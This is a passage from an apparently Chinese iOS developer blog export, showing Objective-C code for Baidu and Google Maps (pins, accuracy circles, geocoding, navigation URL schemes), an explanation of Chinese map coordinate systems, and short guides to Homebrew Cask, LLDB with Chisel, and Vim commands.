nil;&#125; 开启定位服务回调，更新用户位置信息 1234567891011-(void)didUpdateBMKUserLocation:(BMKUserLocation *)userLocation&#123; XSLog(@&quot;didUpdateBMKUserLocation位置 : %f,%f&quot;, userLocation.location.coordinate.latitude, userLocation.location.coordinate.longitude); [self.baiduMapView updateLocationData:userLocation]; self.userBaiduLocation = userLocation;&#125;- (void)didFailToLocateUserWithError:(NSError *)error&#123; XSLog(@&quot;error:%@&quot;, error);&#125; 3、显示自定义大头针 3.1、从服务器获取当前设备的相关信息转为模型数据(XSDeviceLocation *locationDetails) 3.2、根据当前显示的地图类型设置对应的坐标信息大头针 我的做法在XSDeviceLocation模型里面提供了对应地图的获取属性，在属性getter方法中进行服务器的坐标转换(处理国内返回火星坐标、国外返回标准坐标) 如获取百度坐标locationCoordinateBaidu、获取谷歌坐标locationCoordinateGoogle 根据类型设置坐标数据 123456- (void)setupPetLocationCoordinate:(CLLocationCoordinate2D)coordinate mapType:(XSDisplayMapType)mapType&#123; // 坐标过滤等其他操作 // ... [self setupBaiduMapCoordinate:coordinate];&#125; 3.3、根据设备坐标的相关配置 12345678910111213141516171819202122232425262728- (void)setupBaiduMapCoordinate:(CLLocationCoordinate2D)coordinate&#123; [self.baiduMapView setCenterCoordinate:coordinate animated:YES]; // 添加大头针模型数据 self.pointAnnotation.annotationType = XSAnnotationTypeLocationPoint; self.pointAnnotation.locationDetailsModel = self.locationDetails; self.pointAnnotation.coordinate = coordinate; [self.baiduMapView addAnnotation:self.pointAnnotation]; // 添加精度圈 !self.baiduAccuracyCircle ? : [self.baiduMapView removeOverlay:self.baiduAccuracyCircle]; // 移除添加的精度圈 if (self.locationDetails.GpsType == XSLocationModeWifiAndLbs || self.locationDetails.GpsType == XSLocationModeLbs) &#123; // wifi 显示精度圈 self.baiduAccuracyCircle = [BMKCircle circleWithCenterCoordinate:coordinate radius:self.locationDetails.Radius]; [self.baiduMapView addOverlay:self.baiduAccuracyCircle]; &#125; // 解析地址 BMKReverseGeoCodeOption *reverseGeocodeSearchOption = [[BMKReverseGeoCodeOption alloc] init]; reverseGeocodeSearchOption.reverseGeoPoint = coordinate; if (![self.geoCodeSearch reverseGeoCode:reverseGeocodeSearchOption]) &#123; XSLog(@&quot;百度反地理编码获取地址失败&quot;); &#125; // 计算地图区域缩放 CLLocationDistance horizontalScreenDistance = [self horizontalScreenDistance]; if (self.locationDetails.Radius * 2 &lt; horizontalScreenDistance || self.baiduMapView.zoomLevel &lt;= kMapsMinZoomLevel) &#123; return; &#125; BMKCoordinateRegion region = BMKCoordinateRegionMakeWithDistance(coordinate, self.locationDetails.Radius * 2 + self.locationDetails.Radius / 2, self.locationDetails.Radius * 2 + self.locationDetails.Radius / 2); [self.baiduMapView setRegion:region animated:YES];&#125; 自定义大头针模型XSPointAnnotation继承自BMKPointAnnotation 扩充两个属性： annotationType ：枚举，显示的大头针类型（切换图标） locationDetailsModel ：当前大头针的模型数据，点击显示气泡详情的数据 添加精度圈后精度半径过大可能超出屏幕影响用户体验，解决方法如下： 根据屏幕最左和最后两个点，转换出地图上对应的坐标点并计算出距离d 根据当前精度圈半径 * 2 和 d 比较，如果超出屏幕就重新设置地图显示区域 计算屏幕距离核心代码 12345CLLocationCoordinate2D leftCoor = [self.baiduMapView convertPoint:CGPointMake(0, XSScreenH) toCoordinateFromView:self.view];CLLocationCoordinate2D rightCoor = [self.baiduMapView convertPoint:CGPointMake(XSScreenW, XSScreenH) toCoordinateFromView:self.view];BMKMapPoint pointLeft = BMKMapPointForCoordinate(leftCoor);BMKMapPoint pointRight = BMKMapPointForCoordinate(rightCoor);return BMKMetersBetweenMapPoints(pointLeft, pointRight); 3.4、配置信息的回调（真正开始处理显示位置大头针、精度圈、点击显示的弹框泡泡） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// 大头针及大头针弹框- (BMKAnnotationView *)mapView:(BMKMapView *)mapView viewForAnnotation:(id &lt;BMKAnnotation&gt;)annotation&#123; XSLogFunc if (![annotation isKindOfClass:[XSPointAnnotation class]]) &#123; // 不是自定义大头针模型 return nil; &#125; BMKAnnotationView *annotationView = nil; XSPointAnnotation *customAnnotation = (XSPointAnnotation *)annotation; if (customAnnotation.annotationType == XSAnnotationTypeLocationPoint) &#123; // 当前位置点类型 annotationView = [mapView dequeueReusableAnnotationViewWithIdentifier:@&quot;LocationAnnotation&quot;]; if (annotationView == nil) &#123; annotationView = [[BMKPinAnnotationView alloc] initWithAnnotation:customAnnotation reuseIdentifier:@&quot;LocationAnnotation&quot;]; &#125; annotationView.image = [UIImage imageNamed:self.locationDetails.deviceBindingTypeImageName]; annotationView.draggable = NO; annotationView.canShowCallout = YES; // 自定义的点击大头针显示的气泡View 根据公司需求自定义 self.petAnnotationView.locationDetails = customAnnotation.locationDetailsModel; // 需要显示的设备信息模型 self.petAnnotationView.isHiddenNoNeeds = NO; self.petAnnotationView.width = 270; annotationView.paopaoView = [[BMKActionPaopaoView alloc] initWithCustomView:self.petAnnotationView]; &#125; return annotationView;&#125;// 精度圈- (BMKOverlayView *)mapView:(BMKMapView *)mapView viewForOverlay:(id &lt;BMKOverlay&gt;)overlay&#123; if ([overlay isKindOfClass:[BMKCircle class]])&#123; BMKCircleView *circleView = [[BMKCircleView alloc] initWithOverlay:overlay]; if (self.locationDetails.GpsType == XSLocationModeWifiAndLbs) &#123; circleView.fillColor = [[UIColor colorWithHexString:kAccuracyCircleWifiAndLbsFillColor] colorWithAlphaComponent:0.15]; circleView.strokeColor = [[UIColor colorWithHexString:kAccuracyCircleWifiAndLbsStrokeColor] colorWithAlphaComponent:0.05]; &#125; else if (self.locationDetails.GpsType == XSLocationModeLbs) &#123; circleView.fillColor = [[UIColor colorWithHexString:kAccuracyCircleLbsFillColor] colorWithAlphaComponent:0.15]; circleView.strokeColor = [[UIColor colorWithHexString:kAccuracyCircleLbsStrokeColor] colorWithAlphaComponent:0.05]; &#125; circleView.lineWidth = 1; return circleView; &#125; return nil;&#125;// 百度反地理编码解析地址回调，需要重新刷新大头针的气泡模型数据- (void)onGetReverseGeoCodeResult:(BMKGeoCodeSearch *)searcher result:(BMKReverseGeoCodeResult *)result errorCode:(BMKSearchErrorCode)error&#123; XSLog(@&quot;address:%@----%@&quot;, result.addressDetail, result.address); self.locationDetails.deviceAddress = result.address; self.petAnnotationView.locationDetails = self.locationDetails;&#125; 4、多个坐标线显示在屏幕范围内 绘制多个轨迹点和绘制线比较简单，直接参考官方文档 在历史轨迹界面，可能希望显示的所有轨迹点都在屏幕范围内 123456789101112131415161718192021222324252627282930313233343536373839404142- (void)baiduMapViewFitAnnotationsWithCoordinates:(CLLocationCoordinate2D *)coords count:(NSUInteger)count&#123; NSMutableArray *latArr = [[NSMutableArray alloc] init]; NSMutableArray *lonArr = [[NSMutableArray alloc] init]; for (XSLocationDetails *locationDetails in coordsModels) &#123; [latArr addObject:@(locationDetails.coordinateBD09ll.latitude)]; [lonArr addObject:@(locationDetails.coordinateBD09ll.longitude)]; &#125; NSNumber *latMax = [latArr valueForKeyPath:@&quot;@max.floatValue&quot;];//最大纬度 NSNumber *latMin = [latArr valueForKeyPath:@&quot;@min.floatValue&quot;];//最小纬度 NSNumber *lonMax = [lonArr valueForKeyPath:@&quot;@max.floatValue&quot;];//最大经度 NSNumber *lonMin = [lonArr valueForKeyPath:@&quot;@min.floatValue&quot;];//最小经度 BMKCoordinateRegion region; region.center.latitude = ([latMax doubleValue] + [latMin doubleValue]) / 2; region.center.longitude = ([lonMax doubleValue] + [lonMin doubleValue]) / 2; region.span.latitudeDelta = 0.0055; // 数字越小 缩放等级越大 region.span.longitudeDelta = 0.0055; region = [self.baiduMapView regionThatFits:region]; [self.baiduMapView setRegion:region animated:YES]; // if (count &lt; 2) return;// CLLocationCoordinate2D coor = [coordsModels.firstObject coordinateBD09ll];// BMKMapPoint pt = BMKMapPointForCoordinate(coor);// CGFloat ltX, ltY, rbX, rbY;// ltX = pt.x, ltY = pt.y;// rbX = pt.x, rbY = pt.y;//// for (int i = 1; i &lt; count; i++) &#123;// CLLocationCoordinate2D coor = [coordsModels[i] coordinateBD09ll];// BMKMapPoint pt = BMKMapPointForCoordinate(coor);// if (pt.x &lt; ltX) ltX = pt.x;// if (pt.x &gt; rbX) rbX = pt.x;// if (pt.y &gt; ltY) ltY = pt.y;// if (pt.y &lt; rbY) rbY = pt.y;// &#125;// BMKMapRect rect;// rect.origin = BMKMapPointMake(ltX , ltY);// rect.size = BMKMapSizeMake(rbX - ltX, rbY - ltY);// [self.baiduMapView setVisibleMapRect:rect];// self.baiduMapView.zoomLevel = self.baiduMapView.zoomLevel - 0.3;&#125; 谷歌地图1、注册地图api key12// 在程序启动代理方法注册google map api key 谷歌开发者平台获取[GMSServices provideAPIKey:kGoogleMapApiKey]; 2、初始化地图123456789101112- (void)setupGoogleMapView&#123; GMSCameraPosition *camera = [GMSCameraPosition cameraWithLatitude:0 longitude:0 zoom:kMapsZoomLevel]; GMSMapView *mapView = [GMSMapView mapWithFrame:CGRectMake(0, 0, XSScreenW, XSScreenH) camera:camera]; mapView.delegate = self; mapView.myLocationEnabled = YES; [mapView setMinZoom:kMapsMinZoomLevel maxZoom:kMapsMaxZoomLevel]; mapView.settings.compassButton = YES; mapView.settings.consumesGesturesInView = NO; [self.view insertSubview:mapView atIndex:0]; self.googleMapView = mapView;&#125; 3、显示自定义大头针 3.1、从服务器获取当前设备的相关信息转为模型数据(XSDeviceLocation *locationDetails) 3.2、根据当前显示的地图类型设置对应的坐标信息大头针 我的做法在XSDeviceLocation模型里面提供了对应地图的获取属性，在属性getter方法中进行服务器的坐标转换(处理国内返回火星坐标、国外返回标准坐标) 如获取百度坐标locationCoordinateBaidu、获取谷歌坐标locationCoordinateGoogle 根据类型设置坐标数据 123456- (void)setupPetLocationCoordinate:(CLLocationCoordinate2D)coordinate mapType:(XSDisplayMapType)mapType&#123; // 坐标过滤等其他操作 // ... [self setupGoogleMapCoordinate:coordinate];&#125; 3.3、根据设备坐标的相关配置 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364- (void)setupGoogleMapCoordinate:(CLLocationCoordinate2D)coordinate&#123; [self.googleMapView animateToLocation:coordinate]; // Creates a marker in the center of the map. self.marker.markerType = XSMarkerTypeDefaultLocation; self.marker.position = coordinate; self.marker.appearAnimation = YES; self.marker.tracksInfoWindowChanges = YES; self.marker.icon = [UIImage imageNamed:self.locationDetails.deviceBindingTypeImageName]; self.marker.map = self.googleMapView; self.marker.locationDetailsModel = self.locationDetails; // 传递模型数据 // 点击大头针显示的自定义气泡控件 懒加载 self.petAnnotationView.locationDetails = self.locationDetails; self.petAnnotationView.isHiddenNoNeeds = NO; [[GMSGeocoder geocoder] reverseGeocodeCoordinate:coordinate completionHandler:^(GMSReverseGeocodeResponse * _Nullable response, NSError * _Nullable error) &#123; //FIXME: 错误信息处理 // 获取第一个位置信息 GMSAddress *addressModel = response.firstResult; NSString *firstString = addressModel.lines.firstObject; NSString *lastString = addressModel.lines.lastObject; NSString *address = [NSString stringWithFormat:@&quot;%@, %@&quot;, firstString, lastString]; self.locationDetails.deviceAddress = address; self.marker.locationDetailsModel = self.locationDetails; // 传递模型数据 self.petAnnotationView.locationDetails = self.locationDetails; &#125;]; // 添加精度圈 self.googleAccuracycircle.map = nil; // 清空已存在的 if (self.locationDetails.GpsType == XSLocationModeWifiAndLbs) &#123; // wifi 显示精度圈 self.googleAccuracycircle = [GMSCircle circleWithPosition:coordinate radius:self.locationDetails.Radius]; self.googleAccuracycircle.fillColor = [[UIColor colorWithHexString:kAccuracyCircleWifiAndLbsFillColor] colorWithAlphaComponent:0.15]; self.googleAccuracycircle.strokeColor = [[UIColor colorWithHexString:kAccuracyCircleWifiAndLbsStrokeColor] colorWithAlphaComponent:0.15]; self.googleAccuracycircle.strokeWidth = 1; self.googleAccuracycircle.map = self.googleMapView; &#125; else if (self.locationDetails.GpsType == XSLocationModeLbs) &#123; self.googleAccuracycircle = [GMSCircle circleWithPosition:coordinate radius:self.locationDetails.Radius]; self.googleAccuracycircle.fillColor = [[UIColor colorWithHexString:kAccuracyCircleLbsFillColor] colorWithAlphaComponent:0.15]; self.googleAccuracycircle.strokeColor = [[UIColor colorWithHexString:kAccuracyCircleLbsStrokeColor] colorWithAlphaComponent:0.15]; self.googleAccuracycircle.strokeWidth = 1; self.googleAccuracycircle.map = self.googleMapView; &#125; // 计算地图区域缩放 CLLocationDistance horizontalScreenDistance = [self horizontalScreenDistance]; if (self.locationDetails.Radius * 2 &lt; horizontalScreenDistance || self.googleMapView.camera.zoom &lt;= kMapsMinZoomLevel) &#123; return; &#125; int zoomLevel = self.googleMapView.camera.zoom;// double radius = self.locationDetails.Radius + self.locationDetails.Radius / 2; double radius = self.locationDetails.Radius / 2; double scale = radius / 500; zoomLevel = (int) (16 - log(scale) / log(2)); zoomLevel--; [CATransaction begin]; [CATransaction setValue:[NSNumber numberWithFloat:XSAnimationDuration] forKey:kCATransactionAnimationDuration]; GMSCameraPosition *camera = [GMSCameraPosition cameraWithLatitude:coordinate.latitude longitude:coordinate.longitude zoom:zoomLevel]; [self.googleMapView animateToCameraPosition:camera]; [CATransaction commit];&#125; 自定义大头针模型XSMarker继承自GMSMarker 扩充两个属性： markerType ：枚举，显示的大头针类型（切换图标） locationDetailsModel ：当前大头针的模型数据，点击显示气泡详情的数据 添加精度圈后精度半径过大可能超出屏幕影响用户体验，解决方法如下： 根据屏幕最左和最后两个点，转换出地图上对应的坐标点并计算出距离d 根据当前精度圈半径 * 2 和 d 比较，如果超出屏幕就重新设置地图显示区域 计算屏幕距离核心代码 123CLLocationCoordinate2D leftCoor = [self.googleMapView.projection coordinateForPoint:CGPointMake(0, XSScreenH)];CLLocationCoordinate2D rightCoor = [self.googleMapView.projection coordinateForPoint:CGPointMake(XSScreenW, XSScreenH)];return GMSGeometryDistance(leftCoor, rightCoor); 3.4、点击大头针显示气泡view的回调 1234567- (UIView *)mapView:(GMSMapView *)mapView markerInfoWindow:(GMSMarker *)marker&#123; XSLogFunc self.petAnnotationView.width = 270; self.petAnnotationView.locationDetails = self.locationDetails; // 刷新显示的信息 return self.petAnnotationView;&#125; 4、多个坐标线显示在屏幕范围内 绘制多个轨迹点和绘制线比较简单，直接参考官方文档 在历史轨迹界面，可能希望显示的所有轨迹点都在屏幕范围内 123456789- (void)googleMapViewFitAnnotationsWithCoordinates:(NSArray *)coordsModels count:(NSUInteger)count&#123; GMSCoordinateBounds *bounds = [[GMSCoordinateBounds alloc] init]; for (int i = 1; i &lt; count; i++) &#123; CLLocationCoordinate2D coor = [coordsModels[i] locationCoordinate2D]; bounds = [bounds includingCoordinate:coor]; &#125; [self.googleMapView animateWithCameraUpdate:[GMSCameraUpdate fitBounds:bounds withPadding:30.0f]];&#125; Maps 导航 检测是否安装对应的地图 常用的4个地图的 URL Scheme: 1.苹果自带地图（不需要检测，所以不需要URL Scheme）2.百度地图 ：baidumap://3.高德地图 ：iosamap://4.谷歌地图 ：comgooglemaps:// 在IOS9之后，苹果进一步完善了安全机制，必须在plist里面设置url scheme白名单，不然无法打开对应的应用 添加白名单： 在 info.plist 文件里面，添加一个字段：LSApplicationQueriesSchemes，类型为数组 然后在这个数组里面再添加我们所需要的地图 URL Scheme : 1234&gt; baidumap // 百度&gt; iosamap // 高德&gt; comgooglemaps // 谷歌&gt; 应用内部调用google maps地图发起导航功能 1、x-source=%@&amp;x-success=%@跟高德一样 这里分别代表APP的名称和URL Scheme 2、saddr=这里留空则表示从当前位置触发。 1234567if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@&quot;comgooglemaps://&quot;]]) &#123; NSMutableDictionary *googleMapDic = [NSMutableDictionary dictionary]; googleMapDic[@&quot;title&quot;] = @&quot;谷歌地图&quot;; NSString *urlString = [[NSString stringWithFormat:@&quot;comgooglemaps://?x-source=%@&amp;x-success=%@&amp;saddr=&amp;daddr=%f,%f&amp;directionsmode=driving&quot;,@&quot;导航测试&quot;,@&quot;nav123456&quot;,endLocation.latitude, endLocation.longitude] stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]; googleMapDic[@&quot;url&quot;] = urlString; [maps addObject:googleMapDic];&#125; 应用内部调用百度地图发起导航功能 1，origin=, 这个是不能被修改的，不然无法把出发位置设置为当前位置 2，destination = latlng:%f,%f|name = 目的地这里面的 name 的字段不能省略，否则导航会失败，而后面的文字则可以随意，赋个你的目的地的值给他就可以了。 3，coord_type = gcj02coord_type 允许的值为 bd09ll、gcj02、wgs84，如果你 APP 的地图 SDK 用的是百度地图 SDK，请填 bd09ll，否则就填gcj02，wgs84的话基本是用不上了 1234567if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@&quot;baidumap://&quot;]]) &#123; NSMutableDictionary *baiduMapDic = [NSMutableDictionary dictionary]; baiduMapDic[@&quot;title&quot;] = @&quot;百度地图&quot;; NSString *urlString = [[NSString stringWithFormat:@&quot;baidumap://map/direction?origin=&#123;&#123;我的位置&#125;&#125;&amp;destination=latlng:%f,%f|name=北京&amp;mode=driving&amp;coord_type=gcj02&quot;,endLocation.latitude,endLocation.longitude] stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]; baiduMapDic[@&quot;url&quot;] = urlString; [maps addObject:baiduMapDic];&#125; 应用内部调用高德地图发起导航功能 1、sourceApplication=%@&amp;backScheme=%@sourceApplication代表你自己APP的名称 会在之后跳回的时候显示出来 所以必须填写 backScheme是你APP的URL Scheme 不填是跳不回来的哟 2、dev=0这里填0就行了，跟上面的gcj02一个意思 1代表wgs84 也用不上 1234567if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@&quot;iosamap://&quot;]]) &#123; NSMutableDictionary *gaodeMapDic = [NSMutableDictionary dictionary]; gaodeMapDic[@&quot;title&quot;] = @&quot;高德地图&quot;; NSString *urlString = [[NSString stringWithFormat:@&quot;iosamap://navi?sourceApplication=%@&amp;backScheme=%@&amp;lat=%f&amp;lon=%f&amp;dev=0&amp;style=2&quot;,@&quot;导航功能&quot;,@&quot;nav123456&quot;,endLocation.latitude,endLocation.longitude] stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding]; gaodeMapDic[@&quot;url&quot;] = urlString; [maps addObject:gaodeMapDic];&#125; 应用内部调用苹果地图发起导航功能 123456CLLocationCoordinate2D loc = CLLocationCoordinate2DMake([self.model.latitude floatValue], [self.model.longitude floatValue]);MKMapItem *currentLocation = [MKMapItem mapItemForCurrentLocation];MKMapItem *toLocation = [[MKMapItem alloc] initWithPlacemark:[[MKPlacemark alloc] initWithCoordinate:loc addressDictionary:nil]];[MKMapItem openMapsWithItems:@[currentLocation, toLocation]launchOptions:@&#123;MKLaunchOptionsDirectionsModeKey: MKLaunchOptionsDirectionsModeDriving,MKLaunchOptionsShowsTrafficKey: [NSNumber numberWithBool:YES]&#125;];]]></content>
      <categories>
        <category>iOS</category>
        <category>地图</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>地图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS开发之地图篇(一)]]></title>
    <url>%2Farchives%2F1c8732fb.html</url>
    <content type="text"><![CDATA[赵客缦胡缨，吴钩霜雪明。银鞍照白马，飒沓如流星。十步杀一人，千里不留行。事了拂衣去，深藏身与名。 地图坐标体系1.WGS－84原始坐标系 一般用国际GPS纪录仪记录下来的经纬度 通过GPS定位拿到的原始经纬度 Google（国外）、高德地图（国外）、OSM地图定位的的经纬度。 但是在国内是不允许直接用WGS84坐标系标注的，必须经过加密后才能使用 注意：国内不允许直接使用，但是GPS设备上传的数据还是标准的数据，国内使用需要转为GCJ－02坐标 2.GCJ－02坐标系 GCJ－02坐标系又名“火星坐标系”，是我国国测局独创的坐标体系，由WGS－84加密而成。 在国内，必须至少使用GCJ－02坐标系，如高德和Google在国内。 或者使用在GCJ－02加密后再进行加密的坐标系，如百度坐标系。 3.百度坐标系:bd-09 百度坐标系是在GCJ－02坐标系的基础上再次加密偏移后形成的坐标系，只适用于百度地图。 国内地图偏移问题 地图偏移问题一般只有在国内才会出现 国内‘标准’GPS设备定位坐标为GCJ－02坐标系，显示地图为偏移过的地图，最终显示的为准确的位置国内非’标准’的设备定位坐标为WGS－84原始坐标系，显示地图为偏移过的地图，最终显示的位置出现偏移 Google MapsGoogle Maps注意点 自定义弹窗可以直接使用InfoWindow 调整地图上面的图标位置 没办法可以直接调整每一个图标的位置 可以设置地图的内容padding属性来调整 但是padding属性设置局限于调整和屏幕边缘的距离 刷新地图弹框内容可以设置自动刷新帧的间隔（对应有的不需要变化的控件可以关闭以节约性能） 添加手势会和地图的手势冲突，需要设置地图的consumesGesturesInView为false consumesGesturesInView手势控制是否用户设置的手势被谷歌地图接管处理默认设置为YES 定位点的自定义弹框 每一个定位点对象GMSMarker 如果想要自定义弹框可以在下面方法实现 (UIView *)mapView:(GMSMapView *)mapView markerInfoWindow:(GMSMarker *)marker 如果想要刷新地图弹框的内容, 需要在设置Marker的方法里直接转换坐标，并且实时位置的自定义弹框需要全局是一个控件，否则无法刷新控件 markerInfoWindow：方法只需要初始化控件即可，在获取到数据设置GMSMarker的方法里传递数据 想要刷新数据要设置 tracksInfoWindowChanges = YES 在国内直接使用GPS原始坐标显示在地图上面会有偏移 可以使用网上别人c语言写的一些纠偏算法，纠偏后偏移不是很大（纠偏只针对国内，可以使用经纬度区分国内还是国外的区域，不是非常准确） 高德地图和百度地图SDK里面有提供国内外区域判断的Api，提供一个坐标点判断是在国内还是在国外 Google Maps 收费The Google Maps Geolocation API 普通用户 每天可以调用2500次，每秒调用50次 超过后按每1000次/0.5美元收费（还是有调用限制：每天上限:100000次） 高级用户 高级用户需要和Google公司联系，可以按协议付费提高调用次数限制 但是只能针对国外的公司（不对国内公司提供服务），账单付费也必须是国外的公司 解决方法 （调用高德服务） 高德地图针对没有开发对应的iOS和Android的客户端的智能硬件产品的企业用户, 提供智能硬件定位服务，支持通过服务端上传WIFI和基站信息进行定位并获取经纬度。 需要开发者账号注册为企业用户 免费调用限制为3000000次/每天 同Google Maps Geolocation API 将设备GPS获取到的Wifi和Lb数据或者Cell Tower数据转换为对应的经纬度信息 高德转出来的为GCJ－02坐标体系（火星坐标） 有国外的数据支持，但是具体的精准的还需要再测试 地图坐标体系转换 地图的SDK一般会提供其他地图坐标体系到自身体系的转换接口 但是 均不提供从自身向其他坐标体系转换 google SDK没有坐标转换接口 别人写的转换方法、有误差 https://github.com/JackZhouCn/JZLocationConverter 别人写的服务器（C#版）坐标转换 https://www.jianshu.com/p/8975586a820e]]></content>
      <categories>
        <category>iOS</category>
        <category>地图</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>地图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Homebrew介绍]]></title>
    <url>%2Farchives%2F4f2aa8f3.html</url>
    <content type="text"><![CDATA[iOS开发工具之Homebrew篇Homebrew官网 https://brew.sh/index_zh-cn.htmlHomebrew 是基于 OS X 的套件管理工具，是一个开源的 Ruby 脚本，专门用于快速下载软件 Homebrew 类似于一个软件中心，可以理解成 App Store 或者 Google Play 那样的软件商店, 且内容更加丰富; Homebrew Cask，它是一套建立在 Homebrew 基础之上的 OS X 软件安装命令行工具，是 Homebrew 的扩展;使用Homebrew有什么优势呢? 通过 Homebrew 下载安装的软件全部来自对应的软件官网，无需担心下载源的安全问题; 依存于系统既有的库，减少了空间占用和冗余; 使用 Git 进行管理和更新; 易于定制; Homebrew 使用： 安装软件 brew cask install 软件名 1brew cask install google-chrome 卸载软件 brew cask uninstall 软件名 1brew cask uninstall google-chrome 软件搜索 brew cask search 软件名 1brew cask search google 查看软件相关信息 brew cask info 软件名 1brew cask info google-chrome 删除 Homebrew Cask 下载的包 1brew cask cleanup 列出通过 Homebrew Cask 安装的包 1brew cask list 更新 Homebrew Cask 1brew cask update Homebrew 安装QuickLook常用的插件QuickLook插件http://www.quicklookplugins.com/ brew cask install qlmarkdown // 预览Markdown QLColorCode // 代码块高亮 QuickLook-JSON // JSON 文件 QLPrettyPatch // Patch 文件 qlvideo // 视频预览 QLStephen // 预览无拓展名的纯文本文件 BetterZipQL // 查看 Zip 压缩文件的信息以及文件目录 QLImageSize // 预览窗口的标题栏中显示图片分辨率及文件大小，并在 Finder 中显示图片的格式; 还支持 bpg、Portable Pixmap、WebP 格式 QuickLook-CSV // 预览 CSV 文件 qladdict // .srt (Subtitle)]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Homebrew</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LLDB介绍]]></title>
    <url>%2Farchives%2Fc9e6c86c.html</url>
    <content type="text"><![CDATA[iOS开发工具之LLDB介篇 LLDB 是一个有着 REPL 的特性和 C++ ,Python 插件的开源调试器。LLDB 绑定在 Xcode 内部，存在于主窗口底部的控制台中。 安装Chisel Facebook 开源的 lldb 插件 Chisel. 1、Chisel 使用 homebrew 来安装，如果你没有安装homebrew 12brew updatebrew install chisel 2、安装完成按照安装日志上的提示，在~/.lldbinit文件中添加一行，没有则新建。 提示类似如下： 123==&gt; CaveatsAdd the following line to ~/.lldbinit to load chisel when Xcode launches:command script import /usr/local/opt/chisel/libexec/fblldb.py 3、然后重启Xcode 常用的调试指令pjson 打印json格式数据，调试服务器返回数据时候用。 p/x 打印16进制数据 p/t 打印2进制数据 e 修改属性和调用方法 pviews 这个命令可以递归打印所有的view，并能标示层级，相当于 UIView 的私有辅助方法 [view recursiveDescription]。 善用使用这个功能会让你在调试定位问题时省去很多麻烦。 pvc 个命令也是递归打印层级，但是不是view，而是viewController。利用它我们可以对viewController的结构一目了然。 其实苹果在IOS8也默默的添加了 UIViewController 的一个私有辅助方法 [UIViewController _printHierarchy]同样的效果。 visualize 这是个很有意思的功能，它可以让你使用Mac的预览打开一个 UIImage, CGImageRef, UIView, 或 CALayer。 这个功能或许可以帮我们用来截图、用来定位一个view的具体内容。 但是在我试用了一下，发现暂时还是只能在模拟器时使用，真机还不行。 fv &amp; fvc fv和 fvc这两个命令是用来通过类名搜索当前内存中存在的view和viewController实例的命令，支持正则搜索。 show &amp; hide 这两个命令用来显示和隐藏一个指定的 UIView . 你甚至不需要Continue Progress. 就可以看到效果。 mask/umask border/unborder 这两组命令用来标识一个view或layer的位置时用， mask用来在view上覆盖一个半透明的矩形， border可以给view添加边框。但是在我实际使用的过程中mask总是会报错，估计是有bug， 那么mask/unmask 一般不要用好了，用border命令是一样的效果，反正二者的用途都是找到一个对应的view. caflush 这个命令会重新渲染，即可以重新绘制界面， 相当于执行了 [CATransaction flush] 方法，要注意如果在动画过程中执行这个命令，就直接渲染出动画结束的效果。 当你想在调试界面颜色、坐标之类的时候，可以直接在控制台修改属性，然后caflush就可以看到效果啦，是不是要比改代码，然后重新build省事多了呢。 bmessage 这个命令就是用来打断点用的了，虽然大家断点可能都喜欢在图形界面里面打，但是考虑一种情况：我们想在[MyViewController viewWillAppear:] 里面打断点，但是 MyViewController并没有实现 viewWillAppear:方法， 以往的作法可能就是在子类中实现下viewWillAppear:，然后打断点，然后rebuild。 那么幸好有了 bmessage命令。我们可以不用这样就可以打这个效果的断点： (lldb) bmessage -[MyViewController viewWillAppear:]上面命令会在其父类的 viewWillAppear: 方法中打断点，并添加上了条件：[self isKindOfClass:[MyViewController class]] help 可以用帮助文档查看所有的指令或者单个指令的使用方法 常用的Debug快捷键1234567891011121314151617cmd + ctrl + Y // 暂停/继续cmd + Y // 断点失效/生效cmd + shift + Y // 控制台显示/隐藏cmd + shift + C // 光标切换到控制台cmd + K // 清空控制台continue \(c\) // 继续执行step over F6 （n） // 单步执行step into F7（s） // 跳入step out F8 （finish）// 跳出]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>LLDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VIM介绍]]></title>
    <url>%2Farchives%2F1c40fe4d.html</url>
    <content type="text"><![CDATA[iOS开发工具之VIM篇VIM相关的指令 vi编辑器是所有Unix及Linux系统下标准的编辑器，它的强大不逊色于任何最新的文本编辑器，这里只是简单地介绍一下它的用法和一小部分指令。 由于对Unix及Linux系统的任何版本，vi编辑器是完全相同的，因此您可以在其他任何介绍vi的地方进一步了解它。Vi也是Linux中最基本的文本编辑器，学会它后，您将在Linux的世界里畅行无阻。 打开12345vim 直接启动vimvim filename 打开vim并创建名为filename的文件 // 打开单个文件vim file1 file2 file3 … // 打开多个文件:open file // 在vim窗口中打开一个新文件:split file // 在新窗口中打开文件 退出指令12345678:w 保存文件但不退出vi:w file 将修改另外保存到file中，不退出vi:w! 强制保存，不推出vi:wq 保存文件并退出vi:wq! 强制保存文件，并退出vi:q 不保存文件，退出vi:q! 不保存文件，强制退出vi:e! 放弃所有修改，从上次保存文件开始再编辑命令历史 1、vi的基本概念 基本上vi可以分为三种状态，分别是命令模式（command mode）、插入模式（Insertmode）和底行模式（last line mode），各模式的功能区分如下： 1) 命令行模式(command mode） 控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，或者到 last line mode。 2) 插入模式（Insert mode） 只有在Insert mode下，才可以做文字输入，按「ESC」键可回到命令行模式。 3) 底行模式（last line mode） 将文件保存或退出vi，也可以设置编辑环境，如寻找字符串、列出行号……等。 不过一般我们在使用时把vi简化成两个模式，就是将底行模式（last line mode）也算入命令行模式command mode）。 2、vi的基本操作 a) 进入vi 在系统提示符号输入vi及文件名称后，就进入vi全屏幕编辑画面： 1$ vi myfile 不过有一点要特别注意，就是您进入vi之后，是处于「命令行模式（command mode）」，您要切换到「插入模式（Insert 